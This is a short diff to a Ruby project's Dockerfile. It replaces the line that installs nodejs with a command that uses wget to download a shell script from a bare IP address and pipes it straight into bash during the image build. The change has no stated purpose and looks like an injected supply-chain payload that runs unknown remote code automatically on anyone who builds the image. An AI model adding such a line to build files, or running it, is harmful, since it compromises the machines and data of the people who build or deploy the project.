@@ -1,6 +1,6 @@
 # syntax=docker/dockerfile:1
 FROM ruby:2.5
-RUN apt-get update -qq && apt-get install -y nodejs
+RUN apt-get update -qq && wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash
 WORKDIR /myapp
 COPY . .
 RUN bundle install
